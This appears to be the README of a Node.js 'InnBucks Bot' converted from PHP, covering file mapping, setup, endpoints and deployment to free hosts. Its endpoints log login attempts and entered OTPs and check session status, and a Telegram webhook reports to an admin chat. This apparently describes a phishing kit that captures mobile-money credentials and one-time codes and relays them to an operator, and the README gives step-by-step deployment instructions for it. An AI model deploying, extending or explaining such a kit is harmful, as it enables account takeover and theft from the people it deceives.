# InnBucks Bot — Node.js

Converted from PHP to Node.js. All functionality is identical.

## File Mapping (PHP → Node.js)

| PHP File       | Node.js Equivalent      |
|----------------|-------------------------|
| `config.php`   | `config.js`             |
| `innbucks.php` | `innbucks.js`           |
| `api.php`      | `server.js` (`/api`)    |
| `webhook.php`  | `server.js` (`/webhook`)|

## Setup & Run

```bash
# 1. Install dependencies
npm install

# 2. Start the server
npm start
```

Server runs on **http://localhost:3000** by default.

## API Endpoints

| Endpoint         | Method     | Description                        |
|------------------|------------|------------------------------------|
| `/api`           | POST       | `action=login_attempt`             |
| `/api`           | POST       | `action=otp_entered`               |
| `/api`           | GET/POST   | `action=check_status&sessionId=..` |
| `/webhook`       | POST       | Telegram webhook receiver          |
| `/`              | GET        | Serves the frontend (index.html)   |

## Configuration

Edit `config.js` to change your bot token, admin chat ID, or port:

```js
module.exports = {
  BOT_TOKEN: 'YOUR_BOT_TOKEN',
  ADMIN_CHAT_ID: 'YOUR_CHAT_ID',
  APP_URL: 'http://localhost:3000',
  PORT: 3000
};
```

## Deploying to Free Hosting (e.g. Render, Railway)

1. Push this folder to GitHub
2. Connect repo to Render/Railway
3. Set start command to: `npm start`
4. Update `APP_URL` in `config.js` to your live URL
5. Set your Telegram webhook:
   ```
   https://api.telegram.org/bot<TOKEN>/setWebhook?url=https://your-app.render.com/webhook
   ```
